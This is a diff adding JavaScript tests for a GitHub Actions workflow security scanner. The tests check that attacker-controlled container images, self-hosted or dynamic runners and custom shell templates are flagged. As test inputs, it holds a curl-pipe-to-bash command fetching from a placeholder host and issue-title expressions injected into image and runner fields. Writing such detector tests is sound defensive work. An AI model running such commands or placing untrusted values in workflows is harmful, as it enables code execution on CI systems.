@@ -229,3 +229,55 @@ test('ROOT-7: independent review must reject HIGH and BLOCKER findings',()=>{
  assert.match(source,/result\.findings\.some\([^)]*severity\s*===?\s*['"]HIGH['"]/s,
   'HIGH Kotlin/security findings must fail the independent gate');
 });
+
+
+test('ROOT-4: job container and services cannot use attacker sources',()=>{
+ const variants=[
+  ['container: ${{ github.event.issue.title }}'],
+  ['container:','  image: ${{ github.event.issue.title }}'],
+  ['services:','  redis:','    image: ${{ github.event.issue.body }}'],
+  ['container: attacker/image:latest'],
+  ['services:','  redis:','    image: attacker/redis:latest']
+ ];
+ for(const variant of variants){
+  const source=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+   ...variant.map(v=>'    '+v),'    steps:','      - run: echo safe'].join('\n');
+  const result=inspectWorkflow(source);
+  assert.notEqual(result.status,'NO_RISK_PATTERN',JSON.stringify({variant,result}));
+ }
+});
+test('ROOT-4: pinned container digest can be recognized',()=>{
+ const source=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+   '    container: ghcr.io/owner/app@sha256:'+'a'.repeat(64),
+   '    steps:','      - run: echo safe'].join('\n');
+ assert.equal(inspectWorkflow(source).status,'NO_RISK_PATTERN');
+});
+test('ROOT-5: arbitrary literal shell templates cannot bypass a harmless run',()=>{
+ for(const shell of ["bash -c 'curl https://example.invalid/p | bash' -- {0}",
+  "bash -c 'echo changed' -- {0}"]){
+  const source=['on: issues','jobs:','  audit:','    steps:','      - run: echo safe',
+   '        shell: '+shell].join('\n');
+  assert.notEqual(inspectWorkflow(source).status,'NO_RISK_PATTERN',shell);
+ }
+});
+test('ROOT-6: self-hosted and dynamic runner selection is not a clean pass',()=>{
+ for(const runner of ['${{ github.event.issue.title }}','${{ inputs.runner }}',
+  'self-hosted','[self-hosted, linux]','{group: production, labels: gpu}']){
+  const source=['on: issues','jobs:','  audit:','    runs-on: '+runner,
+   '    steps:','      - run: echo safe'].join('\n');
+  assert.notEqual(inspectWorkflow(source).status,'NO_RISK_PATTERN',runner);
+ }
+ for(const runner of ['ubuntu-latest','ubuntu-24.04','windows-latest','macos-latest']){
+  const source=['on: issues','jobs:','  audit:','    runs-on: '+runner,
+   '    steps:','      - run: echo safe'].join('\n');
+  assert.equal(inspectWorkflow(source).status,'NO_RISK_PATTERN',runner);
+ }
+});
+test('ROOT-7: trusted Independent Review must fail HIGH structural and core findings',()=>{
+ const fs=require('node:fs'),path=require('node:path');
+ const source=fs.readFileSync(path.join(__dirname,'../workflows/ultra-sentinel-independent-review.yml'),'utf8');
+ assert.match(source,/structural\.findings\.some\([^\n]*['"]HIGH['"]/,
+  'HIGH YAML risk must fail trusted review');
+ assert.match(source,/result\.findings\.some\([^\n]*['"]HIGH['"]/,
+  'HIGH general risk must fail trusted review');
+});
